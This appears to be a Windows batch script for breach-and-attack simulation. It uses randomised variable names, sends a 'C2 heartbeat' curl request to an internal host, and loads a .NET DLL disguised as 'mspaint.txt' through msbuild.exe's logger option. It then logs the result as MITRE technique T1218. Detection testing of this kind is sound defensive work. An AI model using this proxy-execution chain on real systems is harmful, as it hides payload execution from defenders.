@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET pjkcpgw=%APPDATA%\9464\3a9f53e3
SET ebwae=https://10.0.0.49
SET drguvr=https://10.0.0.49/stage/2/icon.png?9464-7
SET hlbnp=ITZEL-S2B
SET pudaazx=7
SET syjfr=mspaint.txt
SET ewjmdkff=9464

SET zdmvbx=%APPDATA%\!pudaazx!
SET jpmlkb=%APPDATA%\!pudaazx!\macula-simulations.log

echo [!DATE! !TIME!][DEBUG][!hlbnp!]: script_start>> "!jpmlkb!" 2>nul

REM C2 heartbeat (must be first)
echo [!DATE! !TIME!][DEBUG][!hlbnp!]: heartbeat_start>> "!jpmlkb!" 2>nul
curl -k -s -o nul "!drguvr!"
echo [!DATE! !TIME!][DEBUG][!hlbnp!]: heartbeat_complete>> "!jpmlkb!" 2>nul

REM Execute .NET DLL via msbuild logger
echo [!DATE! !TIME!][DEBUG][!hlbnp!]: msbuild_exec_start>> "!jpmlkb!" 2>nul
SET cbfrsm=0
SET mfdjps=
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe /logger:LoggerEntry,"!pjkcpgw!\\!syjfr!";MyParameters,Foo >nul 2>&1
IF !ERRORLEVEL! EQU 0 (
    SET cbfrsm=1
) ELSE (
    SET cbfrsm=0
    SET mfdjps=msbuild_failed_!ERRORLEVEL!
)
echo [!DATE! !TIME!][DEBUG][!hlbnp!]: msbuild_exec_complete=!ERRORLEVEL!>> "!jpmlkb!" 2>nul

REM TTP logging for T1218
FOR /F "tokens=1-3 delims=/ " %%A IN ("!DATE!") DO SET ukbcz=%%C-%%A-%%B
FOR /F "tokens=1-3 delims=:." %%A IN ("!TIME!") DO SET jmfjkv=%%A:%%B:%%C
SET gkqzvf=!jmfjkv!.000
echo [!ukbcz! !gkqzvf!][!hlbnp!]: !pudaazx!-!ewjmdkff!-T1218|Signed Binary Proxy Execution=!cbfrsm!:!mfdjps!>> "!jpmlkb!" 2>nul

echo [!DATE! !TIME!][DEBUG][!hlbnp!]: script_end>> "!jpmlkb!" 2>nul
ENDLOCAL